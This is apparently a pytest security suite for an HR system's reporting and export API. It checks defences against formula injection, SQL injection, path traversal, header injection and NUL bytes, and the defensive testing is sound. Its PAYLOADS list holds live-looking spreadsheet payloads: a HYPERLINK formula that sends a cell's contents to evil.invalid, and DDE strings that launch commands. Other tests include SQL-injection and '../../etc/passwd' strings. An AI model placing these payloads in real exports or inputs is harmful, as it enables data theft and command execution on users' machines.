"""Аудит безопасности зоны «Отчёты»: выгрузки, конструктор, очередь, аналитика.

Каждый тест — атака, повторённая на вымышленных данных, и ожидание
защищённого поведения. Данные — выдуманные люди «Формулов» и «Тестов».
"""

from __future__ import annotations

import csv
import io
import uuid
from datetime import date, timedelta

import pytest
from django.utils import timezone

from humotech.accounts.models import UserRoleScope
from humotech.employees.models import Employee, EmployeeAssignment
from humotech.reports import storage
from humotech.reports.models import ExportJob

pytestmark = pytest.mark.django_db

API = "/api/v1"
EXPORTER = ("reports.export", "employees.read", "attendance.read",
            "analytics.read", "absences.read", "offices.read")

PAYLOADS = [
    "=HYPERLINK(\"http://evil.invalid/?\"&A1,\"x\")",
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
]


@pytest.fixture(autouse=True)
def exports_in_a_temporary_place(settings, tmp_path):
    settings.EXPORTS = {**settings.EXPORTS, "PRIVATE_ROOT": str(tmp_path)}
    return tmp_path


@pytest.fixture()
def exporter(api_client, make_user, organization):
    user = make_user(organization, permissions=EXPORTER)
    api_client.force_authenticate(user=user)
    api_client.user = user
    return api_client


def body_of(response) -> str:
    if hasattr(response, "streaming_content"):
        return b"".join(response.streaming_content).decode("utf-8")
    return response.content.decode("utf-8")


def hire(organization, office, *, last_name, first_name="Тест",
         number=None, middle_name=None) -> Employee:
    person = Employee.objects.create(
        organization=organization,
        employee_number=number or f"SEC-{uuid.uuid4().hex[:6]}",
        first_name=first_name,
        last_name=last_name,
        middle_name=middle_name,
        hire_date=date(2024, 2, 1),
        employment_status="ACTIVE",
    )
    EmployeeAssignment.objects.create(
        organization=organization, employee=person, office=office,
        employment_type="FULL_TIME", work_mode="ONSITE", is_primary=True,
        valid_from=date(2024, 2, 1),
    )
    return person


def csv_cells(text: str) -> list[str]:
    return [cell for row in csv.reader(io.StringIO(text.lstrip("﻿")),
                                       delimiter=";") for cell in row]


def xlsx_cells(payload: bytes):
    from openpyxl import load_workbook

    book = load_workbook(io.BytesIO(payload))
    for sheet in book.worksheets:
        for row in sheet.iter_rows():
            for cell in row:
                yield cell


def dangerous(value) -> bool:
    return isinstance(value, str) and value[:1] in ("=", "+", "-", "@", "\t", "\r")


def builder_job(client, kind="employees", fmt="csv", **extra):
    today = date.today()
    body = {"kind": kind, "fmt": fmt, "builder": True,
            "date_from": (today - timedelta(days=3)).isoformat(),
            "date_to": today.isoformat()}
    body.update(extra)
    return client.post(f"{API}/export-jobs/", body, format="json")


# --- CSV/XLSX-инъекции -------------------------------------------------------


class TestFormulaInjection:
    @pytest.mark.parametrize("fmt", ["csv", "xlsx"])
    def test_legacy_export_neutralises_formula_names(
        self, exporter, organization, office, fmt
    ):
        for index, payload in enumerate(PAYLOADS):
            hire(organization, office, last_name=payload, number=f"=N{index}")

        response = exporter.get(f"{API}/reports/employees/export?fmt={fmt}")

        assert response.status_code == 200
        if fmt == "csv":
            cells = csv_cells(body_of(response))
            assert not [c for c in cells if dangerous(c)]
            assert any(c.startswith("'=HYPERLINK") for c in cells)
        else:
            cells = list(xlsx_cells(response.content))
            assert not [c for c in cells if c.data_type == "f"]
            assert not [c.value for c in cells if dangerous(c.value)]

    @pytest.mark.parametrize("fmt", ["csv", "xlsx"])
    def test_builder_export_neutralises_formula_names(
        self, exporter, organization, office, fmt
    ):
        from humotech.reports.worker import run_once

        for payload in PAYLOADS:
            hire(organization, office, last_name=payload, first_name="-1")
        office.name = "=1+1"
        office.save(update_fields=["name"])

        job_id = builder_job(exporter, fmt=fmt,
                             fields=["employee", "employee_number",
                                     "office", "region"]).json()["id"]
        run_once()
        job = ExportJob.objects.get(id=job_id)
        assert job.status == "SUCCEEDED", job.error_message
        with storage.open_export(job.storage_key) as handle:
            payload = handle.read()

        if fmt == "csv":
            cells = csv_cells(payload.decode("utf-8"))
            assert not [c for c in cells if dangerous(c)]
        else:
            cells = list(xlsx_cells(payload))
            assert not [c for c in cells if c.data_type == "f"]
            assert not [c.value for c in cells if dangerous(c.value)]

    @pytest.mark.parametrize("fmt", ["csv", "xlsx"])
    def test_control_characters_do_not_break_the_export(
        self, exporter, organization, office, fmt
    ):
        """Один сотрудник с управляющим символом в имени не должен ронять
        выгрузку всей организации: openpyxl на «\\x0b» бросает исключение."""
        hire(organization, office, last_name="Ив\x0bанов\x1f")

        response = exporter.get(f"{API}/reports/employees/export?fmt={fmt}")

        assert response.status_code == 200
        text = body_of(response) if fmt == "csv" else None
        if text is not None:
            assert "\x0b" not in text and "\x1f" not in text

    @pytest.mark.parametrize("fmt", ["csv", "xlsx"])
    def test_builder_control_characters_do_not_fail_the_job(
        self, exporter, organization, office, fmt
    ):
        from humotech.reports.worker import run_once

        hire(organization, office, last_name="Пет\x01ров")
        job_id = builder_job(exporter, fmt=fmt).json()["id"]
        run_once()

        job = ExportJob.objects.get(id=job_id)
        assert job.status == "SUCCEEDED", job.error_message

    def test_numbers_stay_numbers(self):
        """Отрицательное число — число, а не текст с апострофом."""
        from humotech.reports.builder import file_value
        from humotech.reports.catalog import Column
        from humotech.reports.export import _cell

        assert _cell(-5) == -5
        assert _cell(-1.25) == -1.25
        assert _cell("-5") == "'-5"
        number = Column("x", "x", "number")
        assert file_value(-3, number, csv_mode=False) == -3
        assert file_value(-3, number, csv_mode=True) == -3
        assert file_value(3600, Column("h", "h", "hours"), csv_mode=False) == 1.0


# --- права и область ---------------------------------------------------------


class TestPermissions:
    def test_export_without_reports_export_is_403(
        self, api_client, make_user, organization, employee
    ):
        api_client.force_authenticate(user=make_user(
            organization, permissions=("employees.read", "attendance.read")))
        for kind in ("employees", "attendance", "sessions", "summary",
                     "lateness", "absences"):
            assert api_client.get(
                f"{API}/reports/{kind}/export").status_code == 403, kind

    def test_export_without_data_permission_is_403(
        self, api_client, make_user, organization, employee
    ):
        api_client.force_authenticate(user=make_user(
            organization, permissions=("reports.export",)))
        for kind in ("employees", "attendance", "sessions", "summary",
                     "lateness", "absences"):
            assert api_client.get(
                f"{API}/reports/{kind}/export").status_code == 403, kind

    def test_foreign_office_in_legacy_filter(
        self, exporter, foreign_office
    ):
        response = exporter.get(
            f"{API}/reports/employees/export?office_id={foreign_office.id}")
        assert response.status_code in (403, 404)

    def test_builder_foreign_office_and_region(
        self, exporter, foreign_office, foreign_region
    ):
        today = date.today().isoformat()
        base = {"kind": "employees", "date_from": today, "date_to": today}
        assert exporter.post(f"{API}/reports/preview", {
            **base, "office_ids": [str(foreign_office.id)]}, format="json"
        ).status_code == 404
        assert exporter.post(f"{API}/reports/preview", {
            **base, "region_id": str(foreign_region.id)}, format="json"
        ).status_code == 404
        assert builder_job(exporter, office_ids=[str(foreign_office.id)]
                           ).status_code == 404

    def test_builder_office_outside_regional_scope(
        self, api_client, make_user, organization, region, office, other_office
    ):
        api_client.force_authenticate(user=make_user(
            organization, permissions=EXPORTER, region=region))
        today = date.today().isoformat()
        response = api_client.post(f"{API}/reports/preview", {
            "kind": "employees", "date_from": today, "date_to": today,
            "office_ids": [str(other_office.id)]}, format="json")
        assert response.status_code == 403

    def test_builder_foreign_department_leaks_nothing(
        self, exporter, other_organization, employee
    ):
        from humotech.departments.models import Department

        secret = Department.objects.create(
            organization=other_organization, code="SECRET", name="Тайный отдел", status="ACTIVE")
        today = date.today().isoformat()
        response = exporter.post(f"{API}/reports/preview", {
            "kind": "employees", "date_from": today, "date_to": today,
            "department_ids": [str(secret.id)]}, format="json")
        assert response.status_code in (200, 404)
        assert "Тайный" not in response.content.decode()

    @pytest.mark.parametrize("fields", [
        ["employee; DROP TABLE employees;--"],
        ["employee\" OR 1=1"],
        ["__class__"],
        ["x" * 50],
    ])
    def test_builder_rejects_unknown_fields(self, exporter, fields, employee):
        today = date.today().isoformat()
        response = exporter.post(f"{API}/reports/preview", {
            "kind": "employees", "date_from": today, "date_to": today,
            "fields": fields}, format="json")
        assert response.status_code == 400

    def test_builder_rejects_huge_field_lists(self, exporter, employee):
        today = date.today().isoformat()
        response = exporter.post(f"{API}/reports/preview", {
            "kind": "employees", "date_from": today, "date_to": today,
            "fields": ["employee"] * 5000}, format="json")
        assert response.status_code == 400

    @pytest.mark.parametrize("limit", ["abc", "10000000000000000000000", "-1", "1e3", None])
    def test_preview_limit(self, exporter, limit, employee):
        today = date.today().isoformat()
        response = exporter.post(f"{API}/reports/preview", {
            "kind": "employees", "date_from": today, "date_to": today,
            "limit": limit}, format="json")
        assert response.status_code == 400

    def test_builder_rejects_a_long_period(self, exporter):
        response = exporter.post(f"{API}/reports/preview", {
            "kind": "attendance", "date_from": "1900-01-01",
            "date_to": "2100-01-01"}, format="json")
        assert response.status_code == 400
        assert builder_job(exporter, kind="attendance", date_from="1900-01-01",
                           date_to="2100-01-01").status_code == 400


# --- даты и мусор в параметрах: 400, а не 500 и не часы работы --------------


class TestHostileParameters:
    @pytest.mark.parametrize("kind", ["attendance", "sessions", "summary",
                                      "lateness", "absences"])
    def test_legacy_export_long_period(self, exporter, kind, employee):
        response = exporter.get(
            f"{API}/reports/{kind}/export?date_from=1900-01-01&date_to=2100-12-31")
        assert response.status_code == 400

    @pytest.mark.parametrize("kind", ["attendance", "sessions", "summary",
                                      "lateness", "absences"])
    @pytest.mark.parametrize("first,last", [
        ("0001-01-01", "0001-01-02"), ("9999-12-30", "9999-12-31"),
    ])
    def test_legacy_export_extreme_dates(self, exporter, kind, first, last, employee):
        response = exporter.get(
            f"{API}/reports/{kind}/export?date_from={first}&date_to={last}"
            f"&date={first}")
        if response.status_code == 200:
            body_of(response)
        assert response.status_code in (200, 400)

    @pytest.mark.parametrize("path", [
        "analytics", "analytics/overview", "analytics/movement",
        "analytics/team", "analytics/probation",
    ])
    @pytest.mark.parametrize("first,last", [
        ("0001-01-01", "0001-01-02"), ("9999-12-30", "9999-12-31"),
        ("1900-01-01", "2100-01-01"), ("2026-13-01", "2026-01-01"),
        ("2026-01-01'--", "2026-01-02"),
    ])
    def test_analytics_dates(self, exporter, path, first, last, employee):
        response = exporter.get(
            f"{API}/{path}?date_from={first}&date_to={last}")
        assert response.status_code in (200, 400), response.content[:300]

    @pytest.mark.parametrize("query", [
        "kind=period&right_first=0001-01-01&right_last=0001-01-02",
        "kind=period&right_first=1900-01-01&right_last=2100-01-01",
        "kind=region", "kind=office&left_id=abc",
        "kind=' OR 1=1--",
    ])
    def test_analytics_compare(self, exporter, query, employee):
        response = exporter.get(f"{API}/analytics/compare?{query}")
        assert response.status_code in (200, 400, 404), response.content[:300]

    @pytest.mark.parametrize("query", [
        "weekday=99", "weekday=-1", "weekday=abc", "people_limit=abc",
        "people_limit=99999999999999999999999", "office_id=' OR 1=1",
        "employee_id=00000000-0000-0000-0000-000000000000",
    ])
    def test_analytics_overview_params(self, exporter, query, employee):
        response = exporter.get(f"{API}/analytics/overview?{query}")
        assert response.status_code in (200, 400, 404), response.content[:300]

    def test_analytics_foreign_office(self, exporter, foreign_office):
        for path in ("analytics", "analytics/overview", "analytics/movement",
                     "analytics/team"):
            response = exporter.get(f"{API}/{path}?office_id={foreign_office.id}")
            assert response.status_code == 404, path

    def test_analytics_outside_regional_scope(
        self, api_client, make_user, organization, region, office, other_office
    ):
        api_client.force_authenticate(user=make_user(
            organization, permissions=EXPORTER, region=region))
        for path in ("analytics", "analytics/overview", "analytics/movement",
                     "analytics/team", "analytics/probation"):
            response = api_client.get(f"{API}/{path}?office_id={other_office.id}")
            assert response.status_code == 403, path

    @pytest.mark.parametrize("query", [
        "date_from=garbage", "date_to=2026-02-30", "date_from=' OR 1=1--",
        "limit=abc", "limit=100000000000000000000", "cursor=!!!",
        "cursor=eyJ4IjoxfQ==", "search=" + "%27%20OR%201=1--",
        "status=' OR 1=1", "request_kind=DROP", "type=';--",
    ])
    def test_requests_queue_params(self, api_client, make_user, organization,
                                   query, employee):
        api_client.force_authenticate(user=make_user(organization, permissions=(
            "absences.read", "attendance.read", "employees.read")))
        for path in ("requests", "requests/counts"):
            response = api_client.get(f"{API}/{path}?{query}")
            assert response.status_code in (200, 400), (path, response.content[:300])


# --- очередь выгрузок --------------------------------------------------------


class TestExportJobs:
    def test_someone_elses_job_is_not_readable(
        self, exporter, api_client, make_user, organization, employee
    ):
        from rest_framework.test import APIClient

        job_id = builder_job(exporter).json()["id"]
        colleague = APIClient()
        colleague.force_authenticate(user=make_user(organization, permissions=EXPORTER))

        assert colleague.get(f"{API}/export-jobs/{job_id}/").status_code == 404
        assert colleague.get(f"{API}/export-jobs/{job_id}/download/").status_code == 404
        assert colleague.post(f"{API}/export-jobs/{job_id}/retry/").status_code == 404
        assert colleague.post(f"{API}/export-jobs/{job_id}/cancel/").status_code == 404
        assert colleague.post(f"{API}/export-jobs/{job_id}/hide/").status_code == 404

    def test_auditor_can_still_read_someone_elses_job(
        self, exporter, make_user, organization, employee
    ):
        from rest_framework.test import APIClient

        job_id = builder_job(exporter).json()["id"]
        auditor = APIClient()
        auditor.force_authenticate(user=make_user(
            organization, permissions=EXPORTER + ("audit.read",)))
        assert auditor.get(f"{API}/export-jobs/{job_id}/").status_code == 200

    def test_download_after_expiry_and_after_role_revoked(
        self, exporter, employee
    ):
        from humotech.reports.worker import run_once

        job_id = builder_job(exporter).json()["id"]
        run_once()
        url = f"{API}/export-jobs/{job_id}/download/"
        assert exporter.get(url).status_code == 200

        ExportJob.objects.filter(id=job_id).update(
            expires_at=timezone.now() - timedelta(seconds=1))
        assert exporter.get(url).status_code == 404

        ExportJob.objects.filter(id=job_id).update(
            expires_at=timezone.now() + timedelta(hours=1))
        UserRoleScope.objects.filter(user=exporter.user).update(
            valid_to=timezone.now() - timedelta(seconds=1))
        assert exporter.get(url).status_code == 403

    def test_job_ids_are_random(self, exporter, employee):
        first = uuid.UUID(builder_job(exporter).json()["id"])
        second = uuid.UUID(builder_job(exporter).json()["id"])
        assert first.version == 4 and second.version == 4
        assert first != second

    def test_blocked_requester_job_is_not_built(self, exporter, employee):
        from humotech.reports.worker import run_once

        job_id = builder_job(exporter).json()["id"]
        user = exporter.user
        user.status = "LOCKED"
        user.save(update_fields=["status"])

        run_once()

        job = ExportJob.objects.get(id=job_id)
        assert job.status == "FAILED"
        assert not job.storage_key

    def test_legacy_job_of_blocked_requester_is_not_built(self, exporter, employee):
        from humotech.reports.worker import run_once

        job_id = exporter.post(f"{API}/export-jobs/",
                               {"kind": "employees", "fmt": "csv"},
                               format="json").json()["id"]
        user = exporter.user
        user.status = "LOCKED"
        user.save(update_fields=["status"])

        run_once()

        assert ExportJob.objects.get(id=job_id).status == "FAILED"

    def test_a_poison_job_does_not_run_forever(self, exporter, employee, settings):
        """Задание, роняющее процесс (OOM), reclaim_stale возвращал бы
        в очередь бесконечно: попытки при возврате не проверялись."""
        from humotech.reports.worker import reclaim_stale

        job_id = builder_job(exporter).json()["id"]
        limit = settings.EXPORTS["MAX_ATTEMPTS"]
        long_ago = timezone.now() - timedelta(days=1)
        ExportJob.objects.filter(id=job_id).update(
            status="RUNNING", attempts=limit, locked_at=long_ago)

        reclaim_stale()

        job = ExportJob.objects.get(id=job_id)
        assert job.status == "FAILED"
        assert job.error_message

    def test_a_stale_job_below_the_limit_goes_back(self, exporter, employee, settings):
        from humotech.reports.worker import reclaim_stale

        job_id = builder_job(exporter).json()["id"]
        ExportJob.objects.filter(id=job_id).update(
            status="RUNNING", attempts=1,
            locked_at=timezone.now() - timedelta(days=1))

        assert reclaim_stale() == 1
        assert ExportJob.objects.get(id=job_id).status == "QUEUED"

    def test_worker_loop_survives_exceptions(self, monkeypatch):
        from humotech.reports.management.commands import run_export_worker

        def boom(*args, **kwargs):
            raise RuntimeError("database went away")

        monkeypatch.setattr(run_export_worker, "run_once", boom)
        monkeypatch.setattr(run_export_worker, "reclaim_stale", boom)
        monkeypatch.setattr(run_export_worker, "purge_expired", boom)

        command = run_export_worker.Command()
        # Один оборот цикла не бросает наружу и сообщает «работы не было».
        assert command.tick(housekeeping=True) is False

    def test_purge_survives_a_broken_file(self, exporter, employee, monkeypatch):
        from humotech.reports.service import purge_expired
        from humotech.reports.worker import run_once

        ids = [builder_job(exporter).json()["id"] for _ in range(2)]
        run_once()
        run_once()
        ExportJob.objects.filter(id__in=ids).update(
            expires_at=timezone.now() - timedelta(seconds=1))
        real_delete = storage.delete
        broken = ExportJob.objects.get(id=ids[0]).storage_key

        def delete(key):
            if key == broken:
                raise OSError("permission denied")
            real_delete(key)

        monkeypatch.setattr(storage, "delete", delete)

        assert purge_expired() == 1
        assert ExportJob.objects.get(id=ids[1]).storage_key is None

    def test_job_filters_cannot_smuggle_extra_keys(self, exporter, employee):
        response = exporter.post(f"{API}/export-jobs/", {
            "kind": "employees", "fmt": "csv",
            "organization_id": str(uuid.uuid4()),
            "requested_by_user_id": str(uuid.uuid4()),
            "status": "SUCCEEDED", "storage_key": "../../etc/passwd",
        }, format="json")
        assert response.status_code == 201
        job = ExportJob.objects.get(id=response.json()["id"])
        assert job.status == "QUEUED"
        assert job.storage_key is None
        assert job.requested_by_user_id == exporter.user.id
        assert set(job.filters) <= {"date", "date_from", "date_to",
                                    "office_id", "region_id"}

    def test_builder_file_name_cannot_traverse(self, exporter, employee):
        from humotech.reports.worker import run_once

        job_id = builder_job(exporter, name="../../etc/passwd\r\nX-Evil: 1").json()["id"]
        run_once()
        job = ExportJob.objects.get(id=job_id)
        assert "/" not in job.file_name and "\n" not in job.file_name
        assert job.storage_key == f"{job_id}.csv"
        response = exporter.get(f"{API}/export-jobs/{job_id}/download/")
        assert "\n" not in response["Content-Disposition"]


class TestScopeLeaks:
    def test_department_of_a_foreign_office_is_not_named(
        self, api_client, make_user, organization, region, office, other_office
    ):
        from humotech.departments.models import Department

        hidden = Department.objects.create(
            organization=organization, office=other_office, code="HIDDEN",
            name="Отдел чужого региона", status="ACTIVE")
        user = make_user(organization, permissions=EXPORTER, region=region)
        api_client.force_authenticate(user=user)
        api_client.user = user
        from humotech.reports.worker import run_once

        job_id = builder_job(api_client, fmt="xlsx",
                             department_ids=[str(hidden.id)]).json()["id"]
        run_once()
        job = ExportJob.objects.get(id=job_id)
        assert job.status == "SUCCEEDED", job.error_message
        with storage.open_export(job.storage_key) as handle:
            values = [c.value for c in xlsx_cells(handle.read())]
        assert not [v for v in values if isinstance(v, str) and "чужого региона" in v]

    def test_legacy_order_without_data_permission_is_refused_at_once(
        self, api_client, make_user, organization, employee
    ):
        api_client.force_authenticate(user=make_user(
            organization, permissions=("reports.export",)))
        response = api_client.post(f"{API}/export-jobs/",
                                   {"kind": "employees", "fmt": "csv"}, format="json")
        assert response.status_code == 403
        assert not ExportJob.objects.exists()

    def test_legacy_order_for_a_foreign_office_is_refused_at_once(
        self, exporter, foreign_office
    ):
        response = exporter.post(f"{API}/export-jobs/", {
            "kind": "employees", "fmt": "csv",
            "office_id": str(foreign_office.id)}, format="json")
        assert response.status_code == 404

    def test_legacy_order_with_an_absurd_day_is_refused_at_once(self, exporter):
        response = exporter.post(f"{API}/export-jobs/", {
            "kind": "attendance", "fmt": "csv", "date": "9999-12-31"}, format="json")
        assert response.status_code == 400


class TestNulBytes:
    """NUL в строке запроса или в теле: PostgreSQL его не принимает,
    и значение, дошедшее до базы, превращается в 500."""

    @pytest.mark.parametrize("path", [
        "reports/employees/export?office_id=%00",
        "reports/attendance/export?date=2026-01-01%00",
        "analytics?date_from=%00&date_to=2026-01-01",
        "analytics/overview?weekday=%00",
        "analytics/compare?kind=%00",
        "analytics/movement?region_id=%00",
        "export-jobs/?status=%00",
        "export-jobs/?kind=%00",
        "export-jobs/counts/?kind=%00",
        "requests?search=%00",
        "requests?status=%00",
        "requests?type=%00",
        "requests?request_kind=%00",
        "requests/counts?search=%00",
        "requests?date_from=%00",
    ])
    def test_query_parameters(self, exporter, make_user, organization, path, employee):
        from rest_framework.test import APIClient

        client = exporter
        if path.startswith("requests"):
            client = APIClient()
            client.force_authenticate(user=make_user(organization, permissions=(
                "absences.read", "attendance.read", "employees.read")))
        response = client.get(f"{API}/{path}")
        assert response.status_code in (200, 400, 404), response.content[:300]

    def test_template_name(self, exporter):
        today = date.today().isoformat()
        response = exporter.post(f"{API}/report-templates/", {
            "template_name": "Отчёт\x00", "kind": "employees",
            "date_from": today, "date_to": today}, format="json")
        assert response.status_code in (201, 400), response.content[:300]

    def test_builder_name_and_fields(self, exporter, employee):
        assert builder_job(exporter, name="Файл\x00").status_code in (201, 400)
        assert builder_job(exporter, fields=["employee\x00"]).status_code == 400


class TestDashboardScope:
    """Передача от absences: карточка «Заявки ждут решения» считала
    открытые заявки всей организации, без области офиса."""

    def _open_request(self, make_absence, person):
        from humotech.absences.models import AbsenceRequest

        make_absence(person, day=date.today() + timedelta(days=5))
        AbsenceRequest.objects.filter(employee=person).update(status="SUBMITTED")

    def _pending(self, client) -> int:
        body = client.get(f"{API}/dashboard").json()
        return next(c["value"] for c in body["cards"] if c["key"] == "pending_requests")

    def test_pending_card_respects_office_scope(
        self, api_client, make_user, make_absence, organization, region,
        office, other_office, employee
    ):
        from rest_framework.test import APIClient

        stranger = hire(organization, other_office, last_name="Чужой")
        self._open_request(make_absence, employee)
        self._open_request(make_absence, stranger)

        regional = APIClient()
        regional.force_authenticate(user=make_user(
            organization, permissions=EXPORTER, region=region))
        whole = APIClient()
        whole.force_authenticate(user=make_user(organization, permissions=EXPORTER))

        assert self._pending(regional) == 1
        assert self._pending(whole) == 2
        # Число на карточке совпадает со списком, на который она ведёт.
        listed = regional.get(f"{API}/absence-requests/pending").json()
        assert len(listed["requests"]) == 1
